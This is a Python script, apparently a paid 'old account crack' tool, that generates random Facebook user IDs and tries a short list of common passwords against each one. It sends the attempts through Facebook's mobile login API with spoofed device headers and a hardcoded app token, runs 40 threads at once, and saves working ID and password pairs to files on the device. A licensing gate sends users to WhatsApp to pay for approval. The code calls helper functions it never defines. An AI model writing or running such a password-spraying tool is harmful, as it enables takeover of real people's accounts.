#----------------------------[IMPORT/MODULE]-----------------------------------#
import requests,bs4,json,os,sys,uuid,random,datetime,time,re
import urllib3,rich,base64
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import os,time,random,json,sys,datetime
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-----------------------------[LINE]-----------------------------------#
def lin():
	print("\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#----------------------------[DATE]-----------------------------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'-'+str(bln)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#----------------------------[COLOR/CODE]-----------------------------------#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#----------------------------[USER/AGENT]-----------------------------------#
def ua():
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    zA=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    xx=f"Mozilla/5.0 (Linux; Android 12; X104-EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6304.201 Mobile Safari/537.36"
    xx=f"Mozilla/5.0 (Linux; Android 14; MI PAD 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6315.215 Mobile Safari/537.36"
    return xx
#----------------------------[LOGO]-----------------------------------#

def superuser():
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "72A".join(uuid)
    DARK=requests.get("https://github.com/Alexmani1/DARK/blob/main/USMANAP.txt").text
    if id in DARK:
        main()
    else:
        os.system("clear")
        print(logo4)
        print("\t \033[1;32m First Get Approvel\033[1;37m ")
        time.sleep(1)
        os.system("clear")
        print(logo4)
        linex()
        print(" YOU NEED GET APPROVED FIRST\033[1;37m")
        linex()
        print("\033[1;31m NOTE : \033[1;37mTwo week Approval list for multiple country \n[•] Pakistan \033[1;36m(350pkr) \n\033[1;37m[•] India    \033[1;36m(150Inr) \n\033[1;37m[•] Bangladesh \033[1;36m(200Taka) \n\033[1;37m[•] Other Country \033[1;36m(3$) \n [•]\033[1;36m FOR PAK USERS EPESA AND JAZZ CASH OTHER USERS BAINANCE")
        linex()
        print(" 🔆Your Key is Not Approved 😴")
        print(" 🔰COPY AND SEND ME IN WHATSAPP 🔰")
        linex()
        print (" \033[1;37m🇵🇰Your Key🇵🇰 : "'\033[1;36m'+'USMAN'+id);linex()
        name = input(" PUT YOUR NAME : ")
        input(" 😁PRESS ENTER TO SEND KEY⏩");linex()
        time.sleep(3.5)
        tks = ''+name+'USMAN'+id
        os.system('am start https://wa.me/+923057637400?text=*HELLO*%2C%20*SIR*%20*I*%20*WANT*%20*TO*%20*YOUR*%20*ANONYMOUS*%20*PAID*%20*TOOL*%20*APPROVAL*%20/%20%20*My*%20*Key*%20*:*%20' + tks)
        
logo4 = (f"""                        
\033[1;36m. ███    ██  █████  ██████  ███████ ███████ ███    ███      |
\033[1;35m. ████   ██ ██   ██ ██   ██ ██      ██      ████  ████      |
\033[1;34m. ██ ██  ██ ███████ ██   ██ █████   █████   ██ ████ ██      |  
\033[1;33m. ██  ██ ██ ██   ██ ██   ██ ██      ██      ██  ██  ██      |
\033[1;32m. ██   ████ ██   ██ ██████  ███████ ███████ ██      ██      |                                                                                                                                                                                                                                                                                                                         
\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━━══━═━═━━══━═━━═━══━══━═━═━═
\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92   NADEEM  ALI-☠️     [-VPN-MH PROXY-] 
[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92m PARDHAN KIING         [-THE BARND-] 
[\033[1;92m\033[1;34m✔\033[1;92m]TOOL           \033[1;91m\033[1;34m: \033[1;92m OLD CRACK-😀❣️      [-BROKEN-NADEEM-]
[\033[1;92m\033[1;34m✔\033[1;92m]STATUS         \033[1;91m\033[1;34m: \033[1;92FREE TOOL 🌺
[\033[1;92m\033[1;34m✔\033[1;92m]VERSION        \033[1;91m\033[1;34m: \033[1;35m[\033[1;32V.6\033[1;35m] THE PARDHAN     [-W/C NADEEN CMAND-]
\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━━══━═━━━══━═━═━━════━═━═━═━═""")
#----------------------------[MAIN/DEF]--------------------------------------------------------------------------#
def main():
    user=[]
    os.system("clear")
    print(logo4)
    print(f'\x1b[38;5;8m\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \033[1;37mEXAMPLE   : \033[1;37m10000 | 20000 | 90000 [-CHOOSE LIMIT ID-] 🙏💔')
    lin()
    limit=input("\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mMATHOD   : ")
    lin()
    os.system('clear')
    print(logo4)
    print("\x1b[38;5;8m(\x1b[1;97m1\x1b[38;5;8m) \x1b[1;97mSELECT MATHOD ~ (2010 - 2009")
    lin()
    ask=input("\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ")
    lin()
    if ask in["1"]:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)
    else:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)    
    with ThreadPool(max_workers=40) as MrDevilEx:
        os.system('clear')
        print(logo4)
        print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mTOTAL ID : {limit} \x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47m  METHOD : \x1b[38;5;86m{ask} KI ACCOUNT SELECTE KIYA')
        print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mIF NO RESULT \x1b[38;5;8m[\x1b[38;5;47mON\x1b[1;97m/\x1b[38;5;47mOF\x1b[38;5;8m]  \x1b[38;5;47mAIRPLANE MODE |-BROEN NADEEM-|')
        lin()
        for mal in user:
            uid=star+mal
            MrDevilEx.submit(login,uid)    
loop=0
oks=[]
def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f"\r\x1b[38;5;8m(\x1b[1;97m{date}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{loop}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{len(oks)}\x1b[38;5;8m)")
        sys.stdout.flush()
        for pw in ["57273200","123456789","1234567","12345678","123456","first@last"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": ua(), 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r{G}|-NADEEM OKY-|  {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/NADEEM-OLD-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r{G}|-NADEEM OKY-|  {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/NADEEM-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r{G}|-NADEEM-OKY-| {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/NADEEM-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass
main()

#main()
#----------------------------[CODE/END]-----------------------------------#
